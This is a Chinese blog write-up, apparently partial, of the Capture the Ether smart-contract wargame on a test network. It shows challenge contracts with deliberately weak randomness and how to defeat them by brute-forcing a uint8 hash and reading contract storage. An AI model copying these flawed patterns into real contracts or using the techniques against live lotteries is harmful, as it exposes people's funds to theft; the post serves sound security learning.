            <span class="post-date" title="2020-07-26 10:44:00">2020/07/26</span>
        </a>
        
        <a  class="密码小屋 Knapsack "
           href="/2020/06/08/密码学学习笔记之knapsack/"
           data-tag="Knapsack"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 knapsack">密码学学习笔记 之 knapsack</span>
            <span class="post-date" title="2020-06-08 10:30:43">2020/06/08</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/26/2020BJD3rd/"
           data-tag="Write Up"
           data-author="Van1sh &amp; FzWjScJ" >
            <span class="post-title" title="2020 BJD3rd">2020 BJD3rd</span>
            <span class="post-date" title="2020-05-26 16:00:47">2020/05/26</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/24/2020GKCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 GKCTF">2020 GKCTF</span>
            <span class="post-date" title="2020-05-24 17:05:00">2020/05/24</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2020/05/20/sage常用命令/"
           data-tag="Sage"
           data-author="Van1sh" >
            <span class="post-title" title="sage常用命令">sage常用命令</span>
            <span class="post-date" title="2020-05-20 11:22:00">2020/05/20</span>
        </a>
        
        <a  class="密码小屋 Paillier "
           href="/2020/05/14/密码学学习笔记之paillier cryptosystem/"
           data-tag="Paillier"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 paillier cryptosystem">密码学学习笔记 之 paillier cryptosystem</span>
            <span class="post-date" title="2020-05-14 11:00:19">2020/05/14</span>
        </a>
        
        <a  class="密码小屋 Lattice "
           href="/2020/05/12/密码学学习笔记之HNP/"
           data-tag="Lattice,Dsa,LCG"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 HNP">密码学学习笔记 之 HNP</span>
            <span class="post-date" title="2020-05-12 10:00:57">2020/05/12</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/10/2020网鼎杯/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 网鼎杯">2020 网鼎杯</span>
            <span class="post-date" title="2020-05-10 21:15:00">2020/05/10</span>
        </a>
        
        <a  class="密码小屋 ECC "
           href="/2020/05/07/密码学学习笔记之NCCIP/"
           data-tag="ECC"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 NCCIP">密码学学习笔记 之 NCCIP</span>
            <span class="post-date" title="2020-05-07 10:30:43">2020/05/07</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/05/2020De1CTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 De1CTF">2020 De1CTF</span>
            <span class="post-date" title="2020-05-05 15:57:00">2020/05/05</span>
        </a>
        
        <a  class="密码小屋 Block "
           href="/2020/03/03/密码学学习笔记之分组密码操作模式/"
           data-tag="操作模式"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 分组密码操作模式">密码学学习笔记 之 分组密码操作模式</span>
            <span class="post-date" title="2020-03-03 15:15:00">2020/03/03</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/02/18/2020hgame_week1/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 hgame week1">2020 hgame week1</span>
            <span class="post-date" title="2020-02-18 16:22:35">2020/02/18</span>
        </a>
        
        <a  class="密码小屋 Stream "
           href="/2020/01/30/密码学学习笔记之RC4与SM4/"
           data-tag="Rc4,SM4"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 RC4与SM4">密码学学习笔记 之 RC4与SM4</span>
            <span class="post-date" title="2020-01-30 00:05:00">2020/01/30</span>
        </a>
        
        <a  class="密码小屋 Rsa "
           href="/2019/12/04/密码学学习笔记之浅析On r-th Root Extraction Algorithm in Fq/"
           data-tag="Rsa"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq">密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq</span>
            <span class="post-date" title="2019-12-04 14:30:46">2019/12/04</span>
        </a>
        
        <a  class="密码小屋 Basic "
           href="/2019/12/03/密码学学习笔记之数论四大定理及应用/"
           data-tag="number theory,Abstract algebra"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 数论四大定理及应用">密码学学习笔记 之 数论四大定理及应用</span>
            <span class="post-date" title="2019-12-03 15:30:25">2019/12/03</span>
        </a>
        
        <a  class="密码小屋 Rsa "
           href="/2019/11/11/密码学学习笔记之浅析Pollard's rho algorithm及其应用/"
           data-tag="Rsa"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用">密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用</span>
            <span class="post-date" title="2019-11-11 15:32:00">2019/11/11</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/11/08/2019UNCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 UNCTF">2019 UNCTF</span>
            <span class="post-date" title="2019-11-08 11:30:30">2019/11/08</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/11/01/docker和docker-compose的安装/"
           data-tag="docker"
           data-author="Van1sh" >
            <span class="post-title" title="安装Docker 和 Docker-Compose以及docker images的制作及上传">安装Docker 和 Docker-Compose以及docker images的制作及上传</span>
            <span class="post-date" title="2019-11-01 21:00:00">2019/11/01</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/09/12/Linux 基础/"
           data-tag="Linux"
           data-author="Vanish" >
            <span class="post-title" title="Linux 基础">Linux 基础</span>
            <span class="post-date" title="2019-09-12 00:17:00">2019/09/12</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/08/29/2019第五空间/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 第五空间">2019 第五空间</span>
            <span class="post-date" title="2019-08-29 12:18:35">2019/08/29</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/08/27/2019OGeek/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 OGeek">2019 OGeek</span>
            <span class="post-date" title="2019-08-27 11:02:35">2019/08/27</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/08/03/2019De1CTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 De1CTF">2019 De1CTF</span>
            <span class="post-date" title="2019-08-03 22:14:55">2019/08/03</span>
        </a>
        
        <a  class="小书屋 "
           href="/2019/08/02/三体/"
           data-tag="book"
           data-author="Van1sh" >
            <span class="post-title" title="三体">三体</span>
            <span class="post-date" title="2019-08-02 12:56:00">2019/08/02</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/07/22/nmap/"
           data-tag="Nmap"
           data-author="Van1sh" >
            <span class="post-title" title="初遇Nmap">初遇Nmap</span>
            <span class="post-date" title="2019-07-22 16:07:55">2019/07/22</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/07/21/python 正则/"
           data-tag="python"
           data-author="Van1sh" >
            <span class="post-title" title="python 之 正则">python 之 正则</span>
            <span class="post-date" title="2019-07-21 22:30:35">2019/07/21</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/07/15/2019赛博杯/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 赛博杯">2019 赛博杯</span>
            <span class="post-date" title="2019-07-15 16:22:35">2019/07/15</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-区块链靶场刷题之cpaturetheether" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">cpature the ether</h1>
    
    <div class="article-meta">
        
        
        <span class="author"><a>Van1sh</a></span>
        
        
        <span class="book">
            
                <a  data-rel="合约小屋">合约小屋</a>/
            
                <a  data-rel="区块链靶场">区块链靶场</a>
            
        </span>
        
        
        <span class="tag">
            
            <a class="color4">CTF</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title='更新时间: 2022-03-09 00:08:22'>2022-03-08 11:03</time>
        
    </div>
    <div class="article-meta">
        
        <span>字数:8.2k</span>
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Warmup"><span class="toc-text">Warmup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Deploy-a-contract"><span class="toc-text">Deploy a contract</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Call-me"><span class="toc-text">Call me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Choose-a-nickname"><span class="toc-text">Choose a nickname</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lotteries"><span class="toc-text">Lotteries</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-the-number"><span class="toc-text">Guess the number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-the-secret-number"><span class="toc-text">Guess the secret number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-the-random-number"><span class="toc-text">Guess the random number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-the-new-number"><span class="toc-text">Guess the new number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Predict-the-future"><span class="toc-text">Predict the future</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Predict-the-block-hash"><span class="toc-text">Predict the block hash</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Math"><span class="toc-text">Math</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Token-sale"><span class="toc-text">Token sale</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token-whale"><span class="toc-text">Token whale</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Retirement-fund"><span class="toc-text">Retirement fund</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mapping"><span class="toc-text">Mapping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Donation"><span class="toc-text">Donation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fifty-years"><span class="toc-text">Fifty years</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Accounts"><span class="toc-text">Accounts</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fuzzy-identity"><span class="toc-text">Fuzzy identity</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Public-Key"><span class="toc-text">Public Key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Account-Takeover"><span class="toc-text">Account Takeover</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Miscellaneous"><span class="toc-text">Miscellaneous</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Assume-ownership"><span class="toc-text">Assume ownership</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token-bank"><span class="toc-text">Token bank</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>是 <a href="https://capturetheether.com/" target="_blank" rel="noopener">cpature the ether</a> 的刷题记录。这个靶场还会在题目介绍里给你推荐歌给你做题的时候听，真好哈哈哈。</p>
<p><img src="https://s2.loli.net/2022/03/08/Yg8o7hIR2ZHU1y9.png" alt="image-20220308110255593"></p>
<h1 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h1><p>The warmup challenges are intended to get you familiar with the way Capture the Ether works and the tools you need to use.</p>
<p> （是一些基础操作。</p>
<h2 id="Deploy-a-contract"><a href="#Deploy-a-contract" class="headerlink" title="Deploy a contract"></a>Deploy a contract</h2><p>To complete this challenge, you need to:</p>
<ol>
<li>Install <a href="https://metamask.io/" target="_blank" rel="noopener">MetaMask</a>.</li>
<li>Switch to the <strong>Ropsten test network</strong>.</li>
<li>Get some Ropsten ether. Clicking the “buy” button in MetaMask will take you to a <em>faucet</em> that gives out free test ether.</li>
</ol>
<p>After you’ve done that, press the red button on the left to deploy the challenge contract.</p>
<p>You don’t need to do anything with the contract once it’s deployed. Just click the “Check Solution” button to verify that you deployed successfully.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DeployChallenge &#123;</span><br><span class="line">    // This tells the CaptureTheFlag contract that the challenge is complete.</span><br><span class="line">    function isComplete() public pure returns (bool) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=LT7MOirwZdM" target="_blank" rel="noopener">Hello</a>.</p>
<p>这儿的题目都是这样，当你确认完成题目之后，点个提交，会产生一笔交易，他会去调用一下题目合约的isComplete()，如果返回True，那么就算成功答题。（调用isComplete()本身是一个不需要费用的call，但是你是让靶场的合约去调用，所以需要支付一定的gas哈哈哈哈）</p>
<p>所以这道题目你需要下载安装metamask插件，然后这个靶场用的Ropsten测试链，去找个Ropsten水管往你账号上打点钱，那么准备工作就完成了。</p>
<p>你只需点击一下 Begin Challenge ，然后再点一下 Check Solution 就可以了。</p>
<h2 id="Call-me"><a href="#Call-me" class="headerlink" title="Call me"></a>Call me</h2><p>To complete this challenge, all you need to do is call a function.</p>
<p>The “Begin Challenge” button will deploy the following contract:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract CallMeChallenge &#123;</span><br><span class="line">    bool public isComplete = false;</span><br><span class="line"></span><br><span class="line">    function callme() public &#123;</span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Call the function named <code>callme</code> and then click the “Check Solution” button.</p>
<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=7ou6MoKmxFQ" target="_blank" rel="noopener">Call On Me</a>.</p>
<p>部署题目后，可以拿到题目的地址，这里我用的在线 <a href="http://remix.ethereum.org/" target="_blank" rel="noopener">remix</a>，</p>
<p><img src="https://s2.loli.net/2022/03/07/7MDGxiuBvHkdLIE.png" alt="image-20220307095853182"></p>
<p>输入合约后进行编译，然后就可以输入题目部署好的地址就可以进行交互，</p>
<p><img src="https://s2.loli.net/2022/03/07/g2wclYDRvdip8aC.png" alt="image-20220307100034117">点</p>
<p>点一下callme函数，（可以看到他是黄色的，说明这是一个交易，需要花gas的那种</p>
<p>然后也可以点一下isComlete确认一下，（可以看到他是蓝色的，所以这是一个不需要花gas的call，）然后就可以回去提交了。</p>
<h2 id="Choose-a-nickname"><a href="#Choose-a-nickname" class="headerlink" title="Choose a nickname"></a>Choose a nickname</h2><p>It’s time to set your Capture the Ether nickname! This nickname is how you’ll show up on the <a href="https://capturetheether.com/leaderboard/" target="_blank" rel="noopener">leaderboard</a>.</p>
<p>The <code>CaptureTheEther</code> smart contract keeps track of a nickname for every player. To complete this challenge, set your nickname to a non-empty string. The smart contract is running on the Ropsten test network at the address <code>0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee</code>.</p>
<p>Here’s the code for this challenge:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">// Relevant part of the CaptureTheEther contract.</span><br><span class="line">contract CaptureTheEther &#123;</span><br><span class="line">    mapping (address =&gt; bytes32) public nicknameOf;</span><br><span class="line"></span><br><span class="line">    function setNickname(bytes32 nickname) public &#123;</span><br><span class="line">        nicknameOf[msg.sender] = nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Challenge contract. You don&apos;t need to do anything with this; it just verifies</span><br><span class="line">// that you set a nickname for yourself.</span><br><span class="line">contract NicknameChallenge &#123;</span><br><span class="line">    CaptureTheEther cte = CaptureTheEther(msg.sender);</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    // Your address gets passed in as a constructor parameter.</span><br><span class="line">    function NicknameChallenge(address _player) public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Check that the first character is not null.</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return cte.nicknameOf(player)[0] != 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=9YZXPs8uAB0" target="_blank" rel="noopener">Say My Name</a>.</p>
<p>这个合约就是让你确定你再排行榜上展示的用户名。部署题目后，部署的是下面这个合约，上面的CaptureTheEther合约是早就部署好的，在0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee，你需要做的是调用 CaptureTheEther 的 setNickname 函数去设定你的用户名。提交后靶场会调用NicknameChallenge 的 isComplete()，去查看在CaptureTheEther合约中，你的账户名开头是不是0。（一个需要注意的小点是，setNickname 函数的输入参数类型是bytes32，然后bytes32在一个slot里的存储是向左对齐的，所以如果你的用户名不够长的话，需要右填充补0。）<a href="https://capturetheether.com/challenges/lotteries/" target="_blank" rel="noopener">Lotteries</a></p>
<h1 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h1><p>Feeling lucky? These challenges will show how hard it is to run a fair lottery.</p>
<p>接下来是六道猜数题。</p>
<h2 id="Guess-the-number"><a href="#Guess-the-number" class="headerlink" title="Guess the number"></a>Guess the number</h2><p>I’m thinking of a number. All you have to do is guess it.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumberChallenge &#123;</span><br><span class="line">    uint8 answer = 42;</span><br><span class="line"></span><br><span class="line">    function GuessTheNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=jgJPSjt1L1M" target="_blank" rel="noopener">Guessing Games</a>.</p>
<p>合约部署的自带一个 eth，然后调用guess函数的时候，要求支付一个 eth，如果猜的数 n 等于 answer，那么就会给你转 2 eth。然后这个answer直接就给你了，是42（刚看完蜜罐合约的我，竟然不是很敢试。。。）</p>
<p>不过题目而已，所以直接调用 guess(42) 就好了，value给到 1 eth</p>
<p><img src="https://s2.loli.net/2022/03/07/vM7SYegF5xsL8ak.png" alt="image-20220307111330137"></p>
<h2 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a>Guess the secret number</h2><p>Putting the answer in the code makes things a little too easy.</p>
<p>This time I’ve only stored the hash of the number. Good luck reversing a cryptographic hash!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheSecretNumberChallenge &#123;</span><br><span class="line">    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function GuessTheSecretNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        if (keccak256(n) == answerHash) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=uc6f_2nPSX8" target="_blank" rel="noopener">Mr. Roboto</a>.</p>
<p>这一次会将你猜的数进行hash之后和answerHash，但是注意道我们的数是 uint8，总共也只有256种可能，所以之前本地爆一下就可以了。</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> <span class="title">public</span> <span class="title">returns</span><span class="params">(uint8)</span>&#123;</span></span><br><span class="line">    <span class="keyword">for</span>(uint8 <span class="built_in">i</span>=<span class="number">0</span>;<span class="built_in">i</span>&lt;=<span class="number">256</span>;<span class="built_in">i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(keccak256(<span class="built_in">i</span>) == answerHash)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">i</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/03/07/VCU4jsb96xRTIXp.png" alt="image-20220307130242119"></p>
<h2 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a>Guess the random number</h2><p>This time the number is generated based on a couple fairly random sources.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function GuessTheRandomNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=9ZkzZIUiHzs" target="_blank" rel="noopener">The Random Song</a>.</p>
<p>这一次要猜的随机数是 <code>answer = uint8(keccak256(block.blockhash(block.number - 1), now));</code></p>
<p>虽然answer变量的值看似随机，不过可以注意到的是，answer变量的取值是在构造函数里面的，那么它其实已经定死了，虽然answer不是public的，不能被直接调用，但是我们可以是直接去看这个合约的存储状态的（所谓去中心化，那一切不都得公开透明）。</p>
<p><img src="https://s2.loli.net/2022/03/07/I5urLdeYCBnGp3A.png" alt="image-20220307131949227"></p>
<p>来到这个地址</p>
<p><img src="https://s2.loli.net/2022/03/07/R1rElwzY7pFZNVO.png" alt="image-20220307132039594"></p>
<p>第一条交易就是合约的构造，点进去，看到state查看合约状态的变化情况</p>
<p><img src="https://s2.loli.net/2022/03/07/HUOzGJ4evwKLdpk.png" alt="image-20220307132301380"></p>
<p>可以看到在slot0处的值由0变成了0a，而slot0的低8位正是储存的我们的answer，所以这里的答案就是0xa</p>
<p><img src="https://s2.loli.net/2022/03/07/3SeMsPp7bocXEg9.png" alt="image-20220307132738907"></p>
<h2 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h2><p>The number is now generated on-demand when a guess is made.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=Qu3aqM1BnLc" target="_blank" rel="noopener">I Guess It’s Christmas Time</a>.</p>
<p>跟上一题差不多，不过这回answer的生成在你调用guess的时候。规则没变，但没法提前知道答案了。当然我们自己也没法在交易的时候瞬间口算是吧，所以需要部署攻击合约了。（这里提一个小点，这个now不是说交易的时间，交易里头是没有记录时间的，这个应该是整个区块的时间戳。）</p>
